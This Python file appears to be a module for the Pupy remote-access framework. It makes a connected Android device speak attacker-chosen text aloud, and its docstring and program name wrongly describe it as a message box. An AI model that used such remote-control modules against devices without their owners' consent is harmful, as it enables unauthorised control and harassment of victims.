# -*- coding: UTF8 -*-
from pupylib.PupyModule import *

__class_name__="AndroidTTS"

class AndroidTTS(PupyModule):
	""" Pop up a custom message box """
	dependencies=['pupydroid.text_to_speach']
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
		self.arg_parser.add_argument('--lang', default='US', help='change the locale')
		self.arg_parser.add_argument('text', help='text to speak out loud')

	@android_only
	def is_compatible(self):
		pass

	def run(self, args):
		self.client.conn.modules['pupydroid.text_to_speach'].speak(args.text, lang=args.lang)
		self.success("The truth has been spoken !")

